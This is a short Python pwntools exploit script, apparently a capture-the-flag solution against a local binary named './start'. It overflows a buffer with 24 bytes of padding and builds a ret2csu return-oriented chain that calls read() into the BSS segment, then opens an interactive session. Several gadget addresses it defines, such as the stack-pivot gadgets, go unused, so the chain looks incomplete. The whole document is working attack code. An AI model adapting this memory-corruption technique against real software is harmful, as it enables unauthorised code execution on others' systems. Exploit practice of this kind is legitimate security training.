from pwn import *

#p = process("./start",env={"LD_PRELOAD":"libc.so.6"})
p = process("./start")
e = ELF("./start")
l = ELF("./libc.so.6",checksec=False)

set_csu = 0x4006ba
call_csu = 0x4006a0
bss = e.bss()
pop_rbp = 0x400550
leave_ret = 0x400651

log.info("Address of BSS : "+str(hex(bss)))

payload = 'A'*24

payload += p64(set_csu)
payload += p64(0)
payload += p64(1)
payload += p64(e.plt['read'])
payload += p64(0)
payload += p64(bss + 0x10)
payload += p64(400)

payload += p64(call_csu)
payload += "A"*8
payload += p64(0)
payload += p64(1)
payload += p64(0)*4
p.send(payload)
p.interactive()
